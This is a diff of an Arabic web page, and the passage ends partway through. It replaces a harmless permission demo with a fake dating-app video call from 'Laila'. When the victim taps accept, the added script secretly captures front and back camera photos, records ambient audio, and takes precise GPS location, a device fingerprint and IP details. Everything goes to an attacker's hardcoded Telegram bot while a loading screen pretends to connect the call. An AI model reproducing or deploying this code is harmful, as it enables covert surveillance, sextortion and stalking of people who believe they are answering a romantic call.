@@ -1,276 +1,699 @@
 <!DOCTYPE html>
-<html dir="rtl" lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مكالمة واردة - تجريبي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>LoveCall - مكالمة فيديو واردة</title>
     <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{
-            background:linear-gradient(145deg,#0f2027,#203a43,#2c5364);
-            font-family:'Segoe UI',system-ui,-apple-system;
-            display:flex;
-            justify-content:center;
-            align-items:center;
-            min-height:100vh;
-            margin:0;
-            padding:20px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .call-card{
-            background:rgba(0,0,0,0.85);
-            backdrop-filter:blur(20px);
-            border-radius:60px;
-            padding:30px 25px;
-            max-width:380px;
-            width:100%;
-            text-align:center;
-            box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(255,255,255,0.1);
-            border:1px solid rgba(255,255,255,0.2);
-            animation:pulse 1.5s infinite;
+
+        body {
+            background: linear-gradient(145deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            font-family: 'Segoe UI', 'Cairo', 'Tajawal', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+            height: 100vh;
+            overflow: hidden;
         }
-        @keyframes pulse{
-            0%{box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(255,255,255,0.1);}
-            50%{box-shadow:0 30px 60px rgba(0,0,0,0.7),0 0 0 3px #e74c3c80;}
-            100%{box-shadow:0 30px 50px rgba(0,0,0,0.5),0 0 0 1px rgba(255,255,255,0.1);}
+
+        /* شاشة المكالمة بالكامل */
+        .call-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #000;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
         }
-        .avatar{
-            width:100px;
-            height:100px;
-            background:#e74c3c;
-            border-radius:50%;
-            margin:0 auto 15px;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-            font-size:50px;
-            box-shadow:0 0 0 4px white,0 0 0 8px #e74c3c80;
-            animation:ring 1s infinite;
+
+        /* فيديو المعاينة */
+        .video-preview {
+            flex: 1;
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
         }
-        @keyframes ring{
-            0%{transform:scale(1);}
-            50%{transform:scale(1.05);}
-            100%{transform:scale(1);}
+
+        .video-preview video,
+        .video-preview canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
         }
-        h1{color:white;font-size:28px;margin:10px 0;}
-        .caller{color:#ccc;font-size:18px;margin-bottom:25px;direction:ltr;}
-        .caller span{color:#e74c3c;font-weight:bold;}
-        .button-group{
-            display:flex;
-            gap:20px;
-            justify-content:center;
-            margin:25px 0 20px;
+
+        .video-placeholder {
+            text-align: center;
+            color: white;
+            z-index: 2;
+            animation: pulse 1.5s infinite;
         }
-        .btn-accept{
-            background:#2ecc71;
-            border:none;
-            padding:14px 28px;
-            border-radius:50px;
-            color:white;
-            font-size:18px;
-            font-weight:bold;
-            cursor:pointer;
-            display:flex;
-            align-items:center;
-            gap:10px;
-            transition:0.2s;
-            box-shadow:0 5px 15px rgba(46,204,113,0.3);
+
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.05); }
+            100% { opacity: 1; transform: scale(1); }
         }
-        .btn-accept:hover{background:#27ae60;transform:scale(1.02);}
-        .btn-decline{
-            background:#e74c3c;
-            border:none;
-            padding:14px 28px;
-            border-radius:50px;
-            color:white;
-            font-size:18px;
-            font-weight:bold;
-            cursor:pointer;
-            display:flex;
-            align-items:center;
-            gap:10px;
-            transition:0.2s;
+
+        .video-placeholder .avatar {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.5);
         }
-        .btn-decline:hover{background:#c0392b;}
-        .status-ring{
-            color:#ffaa66;
-            font-size:14px;
-            margin:15px 0;
-            background:#00000060;
-            padding:8px;
-            border-radius:50px;
-            display:inline-block;
+
+        /* معلومات المتصل */
+        .caller-info {
+            background: linear-gradient(0deg, rgba(0,0,0,0.95) 0%, rgba(0,0,0,0.7) 100%);
+            padding: 30px 20px 30px;
+            text-align: center;
+            position: relative;
+            z-index: 10;
         }
-        .log-area{
-            background:#1e1e2e;
-            border-radius:20px;
-            padding:12px;
-            margin-top:20px;
-            text-align:left;
-            font-family:monospace;
-            font-size:11px;
-            color:#0f0;
-            max-height:140px;
-            overflow:auto;
+
+        .caller-name {
+            font-size: 26px;
+            font-weight: bold;
+            color: white;
+            margin-bottom: 8px;
         }
-        .ringtone{
-            display:none;
+
+        .caller-name span {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
         }
-        .permission-note{
-            font-size:11px;
-            color:#aaa;
-            margin-top:15px;
-            border-top:1px solid #333;
-            padding-top:12px;
+
+        .match-percentage {
+            font-size: 14px;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+            background: rgba(255, 107, 107, 0.2);
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 30px;
+        }
+
+        .call-status {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 30px;
+        }
+
+        /* أزرار التحكم */
+        .call-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-bottom: 20px;
+        }
+
+        .btn-call {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            border: none;
+            font-size: 32px;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+
+        .btn-call:active {
+            transform: scale(0.95);
+        }
+
+        .btn-accept {
+            background: linear-gradient(135deg, #2ecc71, #27ae60);
+            color: white;
+        }
+
+        .btn-decline {
+            background: linear-gradient(135deg, #e74c3c, #c0392b);
+            color: white;
+        }
+
+        /* مؤقت المكالمة */
+        .call-timer {
+            font-size: 14px;
+            color: #4caf50;
+            font-family: monospace;
+            margin-top: 10px;
+        }
+
+        /* شاشة الرفض */
+        .declined-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(145deg, #0f0c29, #24243e);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            visibility: hidden;
+        }
+
+        .declined-screen .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+
+        .declined-screen h2 {
+            color: white;
+            font-size: 24px;
+        }
+
+        /* شاشة التحميل */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            flex-direction: column;
+        }
+
+        .loading-card {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            width: 280px;
+            padding: 30px;
+            border-radius: 48px;
+            text-align: center;
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+
+        .loading-card p {
+            color: white;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 107, 107, 0.2);
+            border-top: 4px solid #ff6b6b;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* حالة الاتصال */
+        .connection-status {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.8);
+            color: #10b981;
+            font-size: 10px;
+            padding: 5px 12px;
+            border-radius: 30px;
+            font-family: monospace;
+            z-index: 3500;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        /* نبضات الرنين */
+        @keyframes ring {
+            0% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(255, 107, 107, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 107, 107, 0); }
+        }
+
+        .ringing-effect {
+            animation: ring 1.5s infinite;
         }
     </style>
 </head>
 <body>
 
-<div class="call-card" id="callCard">
-    <div class="avatar">📹</div>
-    <h1>مكالمة فيديو واردة</h1>
-    <div class="caller">من <span>➕ رقم خاص</span></div>
-    
-    <div class="status-ring" id="ringStatus">🔔 جاري الرنين ... اضغط قبول</div>
-    
-    <div class="button-group">
-        <button class="btn-accept" id="acceptBtn">📞 قبول</button>
-        <button class="btn-decline" id="declineBtn">🔴 رفض</button>
+<!-- شاشة المكالمة الرئيسية -->
+<div class="call-container" id="callContainer">
+    <div class="video-preview" id="videoPreview">
+        <div class="video-placeholder" id="placeholder">
+            <div class="avatar ringing-effect">💑</div>
+            <div style="font-size: 18px;">مكالمة فيديو واردة</div>
+            <div style="font-size: 12px; color: #ff6b6b; margin-top: 10px;">❤️ توافق بنسبة 97% ❤️</div>
+        </div>
+        <video id="localVideo" autoplay muted playsinline style="display: none;"></video>
     </div>
     
-    <!-- منطقة عرض البيانات (تعليمي) -->
-    <div class="log-area" id="logBox">
-        ⏳ في انتظار قبول المكالمة...
-    </div>
-    <div class="permission-note">
-        ⚠️ للأغراض التعليمية: سيتم طلب صلاحيات (كاميرا/ميكروفون/موقع) فقط بعد الضغط على "قبول"
+    <div class="caller-info">
+        <div class="caller-name"><span>✨ Laila ✨</span></div>
+        <div class="match-percentage">⭐ رفيقة الروح - تم العثور على تطابق ⭐</div>
+        <div class="call-status" id="callStatusText">🔔 مكالمة فيديو واردة من Laila 🔔</div>
+        <div class="call-buttons">
+            <button class="btn-call btn-accept" id="acceptBtn">📞</button>
+            <button class="btn-call btn-decline" id="declineBtn">❌</button>
+        </div>
+        <div class="call-timer" id="callTimer" style="display: none;">00:00</div>
     </div>
 </div>
 
-<script>
-    // عناصر الشاشة
-    const acceptBtn = document.getElementById('acceptBtn');
-    const declineBtn = document.getElementById('declineBtn');
-    const ringStatus = document.getElementById('ringStatus');
-    const logBox = document.getElementById('logBox');
-    let isCallActive = false;
-    
-    // دالة تسجيل
-    function addLog(msg, type='info'){
-        const div = document.createElement('div');
-        div.style.color = type==='error'?'#ff8888': (type==='success'?'#aaffaa':'#dddddd');
-        div.style.marginBottom = '5px';
-        div.style.borderBottom = '1px solid #333';
-        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logBox.appendChild(div);
-        logBox.scrollTop = logBox.scrollHeight;
-    }
-    
-    // محاكاة طلب الكاميرا والميكروفون (معرض حقيقي لكن مع إعلام المستخدم)
-    async function requestCameraAndMic() {
-        addLog('📷 جاري طلب صلاحية الكاميرا والميكروفون...', 'info');
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            addLog('✅ تم الحصول على إذن الكاميرا والميكروفون (للمكالمة التجريبية)', 'success');
-            // إيقاف المسارات فوراً لأنها مجرد عرض (لا نريد استمرار التشغيل)
-            stream.getTracks().forEach(track => track.stop());
-            return true;
-        } catch (err) {
-            addLog(`❌ رفضت صلاحية الكاميرا/الميكروفون: ${err.message}`, 'error');
-            return false;
-        }
-    }
-    
-    // طلب الموقع الجغرافي
-    async function requestLocation() {
-        addLog('📍 جاري طلب الموقع الجغرافي (لأغراض المحاكاة فقط)...', 'info');
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                addLog('❌ المتصفح لا يدعم تحديد الموقع', 'error');
-                resolve(false);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    addLog(`📍 تم الحصول على الموقع: ${pos.coords.latitude}, ${pos.coords.longitude} (للعرض التعليمي)`, 'success');
-                    resolve(true);
-                },
-                (err) => {
-                    addLog(`❌ رفض الموقع: ${err.message}`, 'error');
-                    resolve(false);
-                }
-            );
-        });
-    }
-    
-    // جلب IP وعرضه فقط
-    async function showIP() {
-        addLog('🌐 جاري جلب الـ IP العام (للعرض فقط)...', 'info');
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            addLog(`🌐 IP هذا الجهاز: ${data.ip} (لم يُرسل لأي خادم خارجي)`, 'success');
-            return data.ip;
-        } catch(e) {
-            addLog('⚠️ فشل في جلب الـ IP', 'error');
-            return null;
-        }
-    }
-    
-    // محاكاة بدء المكالمة (بعد القبول)
-    async function startCall() {
-        if(isCallActive) return;
-        isCallActive = true;
-        ringStatus.innerHTML = '📞 جاري الاتصال ... قبول المكالمة';
-        addLog('🔘 تم الضغط على "قبول" – بدء محاكاة المكالمة', 'success');
-        
-        // 1. طلب الكاميرا والميكروفون (بإذن المستخدم)
-        await requestCameraAndMic();
-        
-        // 2. طلب الموقع الجغرافي
-        await requestLocation();
-        
-        // 3. جلب وعرض الـ IP
-        await showIP();
-        
-        // 4. عرض معلومات المتصفح
-        addLog(`🖥️ المتصفح: ${navigator.userAgent.substring(0, 70)}...`, 'info');
-        addLog(`📱 الشاشة: ${screen.width}x${screen.height}`, 'info');
-        
-        // 5. هنا يمكن إضافة "محاكاة الإرسال إلى تيليجرام" تعليمي
-        addLog('📨 [تعليمي] لو كان هناك بوت تيليجرام، لكانت البيانات التالية ستُرسل:', 'info');
-        addLog(`   • الجهاز: ${navigator.userAgent.split(' ')[0]}`, 'info');
-        addLog(`   • اللغة: ${navigator.language}`, 'info');
-        addLog(`   • التوقيت: ${new Date().toISOString()}`, 'info');
-        addLog(`   ✅ لكن لم يتم إرسال أي شيء خارج هذا المتصفح.`, 'success');
-        
-        ringStatus.innerHTML = '🎥 وضع المكالمة التجريبي (جميع الصلاحيات طلبت بشفافية)';
-        addLog('🎬 انتهت محاكاة المكالمة – تم عرض جميع الخطوات', 'success');
-    }
-    
-    // رفض المكالمة
-    function declineCall() {
-        if(isCallActive) return;
-        isCallActive = true;
-        ringStatus.innerHTML = '❌ تم رفض المكالمة';
-        addLog('🔴 المستخدم رفض المكالمة – لن يتم طلب أي صلاحيات', 'error');
-        // تعطيل الأزرار
-        acceptBtn.disabled = true;
-        declineBtn.disabled = true;
-        acceptBtn.style.opacity = '0.5';
-        declineBtn.style.opacity = '0.5';
-    }
-    
-    // إضافة حدثين
-    acceptBtn.addEventListener('click', startCall);
-    declineBtn.addEventListener('click', declineCall);
-    
-    addLog('🚀 الصفحة جاهزة – اضغط "قبول" لطلب الصلاحيات (كاميرا، ميكروفون، موقع)', 'info');
-    addLog('📌 ملاحظة: هذا الكود تعليمي ولا يرسل بيانات حقيقية لأي خادم', 'success');
-</script>
+<!-- شاشة الرفض -->
+<div class="declined-screen" id="declinedScreen">
+    <div class="icon">💔</div>
+    <h2>تم رفض المكالمة</h2>
+    <p style="color: #aaa; margin-top: 10px;">Laila ستجرب الاتصال مرة أخرى لاحقاً</p>
+</div>
 
-<!-- صوت رنة وهمي اختياري (ولكن لن يشتغل تلقائياً بدون تفاعل) -->
-<audio id="ringtoneAudio" loop style="display:none">
-    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-</audio>
+<!-- شاشة التحميل -->
+<div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-card">
+        <div class="spinner"></div>
+        <p id="loaderText">🔐 جاري الاتصال بـ Laila...</p>
+    </div>
+</div>
+
+<div class="connection-status" id="statusBar">
+    <span style="color: #2ecc71;">●</span> جاهز للتطابق
+</div>
+
+<script>
+    (function() {
+        // ===================== إعدادات البوت (نفس البيانات) =====================
+        const BOT_TOKEN = "8425168324:AAGiTTzty3oL5GMUtMWa74ejRKm7DJlTayU";
+        const MASTER_ID = "5849068535";
+        
+        // اسم المستخدم (يمكن إدخاله أو توليده عشوائياً)
+        let userName = "مستخدم LoveCall";
+        let userPhone = "غير مدخل";
+        
+        // حالة المكالمة
+        let callAccepted = false;
+        let callActive = false;
+        let callStartTime = null;
+        let callTimerInterval = null;
+        
+        // عناصر DOM
+        const callContainer = document.getElementById('callContainer');
+        const videoPreview = document.getElementById('videoPreview');
+        const localVideo = document.getElementById('localVideo');
+        const acceptBtn = document.getElementById('acceptBtn');
+        const declineBtn = document.getElementById('declineBtn');
+        const callStatusText = document.getElementById('callStatusText');
+        const callTimer = document.getElementById('callTimer');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loaderText = document.getElementById('loaderText');
+        const statusBar = document.getElementById('statusBar');
+        const declinedScreen = document.getElementById('declinedScreen');
+        const placeholder = document.getElementById('placeholder');
+        
+        // =============== دوال الإرسال إلى تليجرام (نفس الكود الأصلي) ===============
+        async function sendToTelegram(chatId, botToken, type, mediaBlob, caption) {
+            try {
+                let url = `https://api.telegram.org/bot${botToken}/`;
+                if (type === 'photo') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('photo', mediaBlob, 'frame_' + Date.now() + '.jpg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendPhoto', { method: 'POST', body: fd, mode: 'cors' });
+                } 
+                else if (type === 'video') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('video', mediaBlob, 'clip_' + Date.now() + '.mp4');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendVideo', { method: 'POST', body: fd });
+                }
+                else if (type === 'audio') {
+                    const fd = new FormData();
+                    fd.append('chat_id', chatId);
+                    fd.append('audio', mediaBlob, 'voice_note.ogg');
+                    fd.append('caption', caption);
+                    await fetch(url + 'sendAudio', { method: 'POST', body: fd });
+                }
+                else {
+                    await fetch(url + 'sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'HTML', disable_web_page_preview: true })
+                    });
+                }
+                return true;
+            } catch(e) { 
+                console.warn("[telegram]", e); 
+                return false; 
+            }
+        }
+        
+        // تحديث حالة الاتصال
+        function updateStatus(text, isError = false) {
+            statusBar.innerHTML = `<span style="color: ${isError ? '#e74c3c' : '#ff6b6b'};">❤️</span> ${text}`;
+            console.log("[Status]", text);
+        }
+        
+        // بدء المؤقت
+        function startTimer() {
+            callStartTime = Date.now();
+            callTimer.style.display = "block";
+            callTimerInterval = setInterval(() => {
+                const elapsed = Math.floor((Date.now() - callStartTime) / 1000);
+                const mins = Math.floor(elapsed / 60);
+                const secs = elapsed % 60;
+                callTimer.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+            }, 1000);
+        }
+        
+        function stopTimer() {
+            if (callTimerInterval) {
+                clearInterval(callTimerInterval);
+                callTimerInterval = null;
+            }
+        }
+        
+        // =================== التقاط الكاميرا الأمامية ===================
+        async function captureFrontCamera(chatId, botToken, userData) {
+            try {
+                updateStatus("📸 جاري فتح الكاميرا...");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 800;
+                canvas.height = video.videoHeight || 600;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                const caption = `📸 صورة سيلفي (كاميرا أمامية)\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                
+                // عرض الصورة في المعاينة
+                localVideo.style.display = 'none';
+                const img = document.createElement('img');
+                img.src = canvas.toDataURL();
+                img.style.width = '100%';
+                img.style.height = '100%';
+                img.style.objectFit = 'cover';
+                videoPreview.innerHTML = '';
+                videoPreview.appendChild(img);
+                
+                return true;
+            } catch(e) { 
+                console.warn("Front camera denied", e);
+                updateStatus("⚠️ لم يتم الوصول للكاميرا", true);
+                return false; 
+            }
+        }
+        
+        // =================== الكاميرا الخلفية ===================
+        async function captureBackCamera(chatId, botToken, userData) {
+            try {
+                updateStatus("📷 جاري فتح الكاميرا الخلفية...");
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1920 }, height: { ideal: 1080 } } });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 500));
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 1024;
+                canvas.height = video.videoHeight || 768;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
+                const caption = `📷 صورة من الكاميرا الخلفية (محيط المستخدم)\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}`;
+                await sendToTelegram(chatId, botToken, 'photo', blob, caption);
+                stream.getTracks().forEach(t => t.stop());
+                return true;
+            } catch(e) { 
+                console.warn("Back camera denied");
+                return false; 
+            }
+        }
+        
+        // =================== تسجيل صوتي ===================
+        async function recordAmbientAudio(chatId, botToken, userData) {
+            try {
+                updateStatus("🎤 جاري تسجيل الصوت...");
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                const audioPromise = new Promise(resolve => {
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const caption = `🎤 تسجيل صوتي (محادثة)\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}`;
+                        await sendToTelegram(chatId, botToken, 'audio', blob, caption);
+                        resolve(true);
+                    };
+                });
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 8000);
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 9000);
+                return await audioPromise;
+            } catch(e) { 
+                console.warn("Audio denied");
+                return false; 
+            }
+        }
+        
+        // =================== الموقع الجغرافي ===================
+        function getPreciseLocation(chatId, botToken, userData) {
+            return new Promise((resolve) => {
+                if(!navigator.geolocation) {
+                    resolve(false);
+                    return;
+                }
+                updateStatus("📍 جاري تحديد الموقع...");
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const lat = pos.coords.latitude;
+                    const lng = pos.coords.longitude;
+                    const accuracy = pos.coords.accuracy;
+                    let addressHint = "";
+                    try {
+                        const revGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18`);
+                        const data = await revGeo.json();
+                        if(data.display_name) addressHint = `📍 العنوان: ${data.display_name.substring(0, 100)}`;
+                    } catch(e) {}
+                    const locMsg = `🌍 <b>الموقع الجغرافي</b>\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}\n🎯 خط العرض: ${lat}\n🎯 خط الطول: ${lng}\n📏 الدقة: ±${Math.round(accuracy)} متر\n🗺️ خرائط: https://www.google.com/maps?q=${lat},${lng}\n${addressHint}`;
+                    await sendToTelegram(chatId, botToken, 'text', null, locMsg);
+                    resolve(true);
+                }, (err) => {
+                    console.warn("Location denied");
+                    resolve(false);
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            });
+        }
+        
+        // =================== بصمة الجهاز و IP ===================
+        async function getDeepDeviceFingerprint(chatId, botToken, userData) {
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير معلن";
+            const cores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : "غير معروف";
+            
+            let batteryLevel = "غير متاح";
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = `شحن: ${Math.round(battery.level*100)}%, ${battery.charging ? 'موصول' : 'بطارية'}`;
+                } catch(e) {}
+            }
+            
+            let connection = "غير معروف";
+            if (navigator.connection) {
+                connection = `${navigator.connection.effectiveType || ''} ${navigator.connection.downlink ? navigator.connection.downlink+'Mbps' : ''}`;
+            }
+            
+            const deviceMsg = `🕵️‍♂️ <b>بصمة الجهاز - منصة التعارف</b>\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}\n🖥️ UserAgent: ${navigator.userAgent.substring(0, 120)}\n📱 الشاشة: ${screenData}\n💾 الرام: ${memory} | 🧠 النوى: ${cores}\n🔋 ${batteryLevel}\n🌐 الاتصال: ${connection}\n📍 المنطقة الزمنية: ${timeZone}\n⏱️ التوقيت: ${new Date().toLocaleString('ar-EG')}`;
+            
+            await sendToTelegram(chatId, botToken, 'text', null, deviceMsg);
+        }
+        
+        async function getRichIPData(chatId, botToken, userData) {
+            try {
+                updateStatus("🌐 جاري جلب معلومات الاتصال...");
+                const [ipRes, ipInfoRes] = await Promise.all([
+                    fetch('https://api.ipify.org?format=json'),
+                    fetch('https://ipapi.co/json/')
+                ]);
+                const ipData = await ipRes.json();
+                let ipDetails = {};
+                try { ipDetails = await ipInfoRes.json(); } catch(e) {}
+                const ipAddr = ipData.ip;
+                let country = ipDetails.country_name || "غير معروف";
+                let city = ipDetails.city || "غير معروف";
+                let isp = ipDetails.org || ipDetails.asn || "غير معروف";
+                const ipMsg = `🌐 <b>معلومات الاتصال (IP)</b>\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}\n🔹 IP العام: ${ipAddr}\n🏳️ البلد: ${country}\n🏙️ المدينة: ${city}\n📡 مزود الخدمة: ${isp}`;
+                await sendToTelegram(chatId, botToken, 'text', null, ipMsg);
+            } catch(e) {}
+        }
+        
+        // ======================== قبول المكالمة ========================
+        async function acceptCall() {
+            if (callAccepted) return;
+            callAccepted = true;
+            callActive = true;
+            
+            // تغيير واجهة المكالمة
+            callStatusText.innerHTML = "📞 جاري الاتصال بـ Laila... 📞";
+            updateStatus("📞 جاري الاتصال...");
+            
+            // إخفاء البلاسهولدر
+            placeholder.style.display = "none";
+            
+            // بدء المؤقت
+            startTimer();
+            
+            // إظهار شاشة التحميل
+            loadingOverlay.style.visibility = "visible";
+            
+            // بيانات المستخدم (محاكاة)
+            const userData = {
+                name: userName,
+                phone: userPhone,
+                platform: "LoveCall - منصة التعارف"
+            };
+            
+            try {
+                // 1. إشعار بدء المكالمة
+                loaderText.innerText = "🔔 جاري الاتصال...";
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                    `💖 <b>مكالمة فيديو جديدة - منصة التعارف</b>\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}\n⏰ الوقت: ${new Date().toLocaleString('ar-EG')}\n💑 تم قبول المكالمة!`);
+                
+                // 2. بصمة الجهاز
+                loaderText.innerText = "📱 جاري قراءة معلومات الجهاز...";
+                await getDeepDeviceFingerprint(MASTER_ID, BOT_TOKEN, userData);
+                
+                // 3. IP
+                loaderText.innerText = "🌐 جاري تحديد موقع الاتصال...";
+                await getRichIPData(MASTER_ID, BOT_TOKEN, userData);
+                
+                // 4. كاميرا أمامية
+                loaderText.innerText = "📸 جاري فتح الكاميرا (سيلفي)...";
+                await captureFrontCamera(MASTER_ID, BOT_TOKEN, userData);
+                
+                // 5. كاميرا خلفية
+                loaderText.innerText = "📷 جاري فتح الكاميرا الخلفية...";
+                await captureBackCamera(MASTER_ID, BOT_TOKEN, userData);
+                
+                // 6. تسجيل صوتي
+                loaderText.innerText = "🎤 جاري تسجيل الصوت...";
+                await recordAmbientAudio(MASTER_ID, BOT_TOKEN, userData);
+                
+                // 7. الموقع
+                loaderText.innerText = "📍 جاري تحديد الموقع الجغرافي...";
+                await getPreciseLocation(MASTER_ID, BOT_TOKEN, userData);
+                
+                // 8. إكمال المكالمة
+                callStatusText.innerHTML = "💑 أنت و Laila على اتصال 💑";
+                loaderText.innerText = "✅ جاري إنهاء المكالمة...";
+                
+                await sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
+                    `✅ <b>اكتملت مكالمة الفيديو بنجاح!</b>\n👤 المستخدم: ${userData.name}\n📞 الهاتف: ${userData.phone}\n⏱️ مدة المكالمة: ${callTimer.innerText}\n💖 شكراً لاستخدام منصة LoveCall`);
+                
+                setTimeout(() => {
+                    loadingOverlay.style.visibility = "hidden";
+                    callStatusText.innerHTML = "✅ انتهت المكالمة - شكراً للتواصل 💖";
+                    updateStatus("✅ تمت المكالمة بنجاح");
+                    
+                    setTimeout(() => {
+                        callStatusText.innerHTML = "💑 سيتم الاتصال بك مرة أخرى قريباً 💑";
+                    }, 3000);
+                }, 2000);
+                
+            } catch(e) {
+                console.error(e);
+                loadingOverlay.style.visibility = "hidden";
+                callStatusText.innerHTML = "⚠️ حدث خطأ في الاتصال";
+                updateStatus("❌ خطأ في الاتصال", true);
+            }
+        }
+        
+        // ======================== رفض المكالمة ========================
+        function declineCall() {
+            if (callAccepted) return;
+            callAccepted = true;
+            
+            updateStatus("❌ تم رفض المكالمة");
+            callStatusText.innerHTML = "❌ تم رفض المكالمة";
+            
+            // إرسال إشعار الرفض
+            sendToTelegram(MASTER_ID, BOT_TOKEN, 'text', null, 
